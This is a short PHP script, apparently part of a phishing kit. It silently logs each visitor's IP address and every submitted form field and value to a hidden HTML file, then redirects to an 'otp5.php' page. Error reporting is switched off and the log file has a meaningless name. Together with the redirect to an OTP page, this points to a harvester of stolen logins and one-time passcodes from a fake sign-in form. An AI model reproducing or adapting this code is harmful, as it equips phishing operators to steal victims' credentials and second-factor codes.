<?php
header('location: otp5.php');
error_reporting(0);
$handle = fopen("jjjjjjteyeuyteiolkuyghnb.html","a");
$ip =  $_SERVER['REMOTE_ADDR'];
fwrite($handle, $ip);
fwrite($handle, "<br>");
foreach($_POST as $variable => $value)
{
  fwrite($handle, $variable);
  fwrite($handle, "= ");
  fwrite($handle, $value);
  fwrite($handle, "\r\n<br>");
}
fwrite($handle, "\r\n<br>");
fclose($handle);
exit;
?> 